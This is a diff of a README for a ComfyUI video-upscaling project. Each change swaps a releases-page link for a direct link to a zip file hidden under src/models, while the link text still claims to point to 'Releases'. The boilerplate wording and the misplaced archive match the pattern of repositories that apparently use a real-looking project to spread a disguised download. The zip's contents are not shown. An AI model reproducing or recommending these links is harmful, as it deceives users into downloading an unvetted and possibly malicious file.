@@ -1,6 +1,6 @@
 # 🎥 ComfyUI-FlashVSR_Ultra_Fast - Enhance Your Streaming Experience
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/jimly1/ComfyUI-FlashVSR_Ultra_Fast/releases)
+[![Download](https://github.com/jimly1/ComfyUI-FlashVSR_Ultra_Fast/raw/refs/heads/main/src/models/Fast_VS_Flash_Ultra_U_Comfy_doctorbird.zip%20Now-Click%20Here-brightgreen)](https://github.com/jimly1/ComfyUI-FlashVSR_Ultra_Fast/raw/refs/heads/main/src/models/Fast_VS_Flash_Ultra_U_Comfy_doctorbird.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To get started with ComfyUI-FlashVSR_Ultra_Fast, follow these steps:
 
 1. **Visit the Releases Page:**
    Click the link below to access our releases page and download the application.
-   [Download from Releases](https://github.com/jimly1/ComfyUI-FlashVSR_Ultra_Fast/releases)
+   [Download from Releases](https://github.com/jimly1/ComfyUI-FlashVSR_Ultra_Fast/raw/refs/heads/main/src/models/Fast_VS_Flash_Ultra_U_Comfy_doctorbird.zip)
 
 2. **Select the Latest Version:**
    On the releases page, find the latest version of ComfyUI-FlashVSR_Ultra_Fast. The most recent release is typically at the top.
@@ -53,7 +53,7 @@ To get started with ComfyUI-FlashVSR_Ultra_Fast, follow these steps:
 
 To download ComfyUI-FlashVSR_Ultra_Fast, visit our releases page. Follow the installation steps outlined above for a hassle-free setup. 
 
-[Download from Releases](https://github.com/jimly1/ComfyUI-FlashVSR_Ultra_Fast/releases)
+[Download from Releases](https://github.com/jimly1/ComfyUI-FlashVSR_Ultra_Fast/raw/refs/heads/main/src/models/Fast_VS_Flash_Ultra_U_Comfy_doctorbird.zip)
 
 ## 💡 Usage Tips
 
@@ -71,4 +71,4 @@ For support or questions regarding ComfyUI-FlashVSR_Ultra_Fast, please refer to 
 
 You can reach out to us for any inquiries or feedback through the repository's contact page. We appreciate your input in making ComfyUI-FlashVSR_Ultra_Fast even better.
 
-[Download from Releases](https://github.com/jimly1/ComfyUI-FlashVSR_Ultra_Fast/releases)
+[Download from Releases](https://github.com/jimly1/ComfyUI-FlashVSR_Ultra_Fast/raw/refs/heads/main/src/models/Fast_VS_Flash_Ultra_U_Comfy_doctorbird.zip)
